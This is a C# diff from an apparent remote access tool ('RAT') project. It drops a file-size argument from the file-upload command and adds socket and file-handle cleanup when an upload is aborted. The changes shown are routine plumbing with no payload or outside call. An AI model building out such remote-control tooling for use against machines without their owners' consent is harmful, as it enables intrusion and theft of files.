@@ -49,28 +49,8 @@ namespace RAT.Logic.RatCommands.Commands
                 return;
             }
 
-            int indexOfSize = Array.IndexOf(args, "-s");
-            if (indexOfSize == -1 || args.ElementAtOrDefault(indexOfSize + 1) == null)
-            {
-                _notificationLogic.NotifyClient($"\n\"-s\" (file size) argument not found for RAT\n");
-                return;
-            }
-
             string filePath = args[indexOfPath + 1];
-            string fileSizeInStringFormat = args[indexOfSize + 1];
-
-            int fileSize = 0;
-            try
-            {
-                fileSize = Convert.ToInt32(fileSizeInStringFormat);
-            }
-            catch (Exception exception)
-            {
-                _notificationLogic.NotifyClient($"\nError: {exception.Message}\n{fileSizeInStringFormat} is bad number\n");
-                return;
-            }
-
-            _fileUploader.PrepareForFileUpload(filePath, fileSize);
+            _fileUploader.PrepareForFileUpload(filePath);
         }
 
         /// <summary>
@@ -83,11 +63,19 @@ namespace RAT.Logic.RatCommands.Commands
             {
                 state.FileUploadInformation.ClientFileUploadSocket?.Disconnect(reuseSocket: false);
                 state.FileUploadInformation.ClientFileUploadSocket?.Close();
+                state.FileUploadInformation.FileDataArray = null;
             }
             catch (Exception exception)
             {
                 _notificationLogic.NotifyClient($"Error during operation abort: {exception.Message}");
             }
+
+            try
+            {
+                state.FileUploadInformation.FileHandle?.Dispose();
+                state.FileUploadInformation.FileHandle?.Close();
+            }
+            catch (Exception) { }
 
             state.FileUploadInformation = new FileUploadInformation();
         }
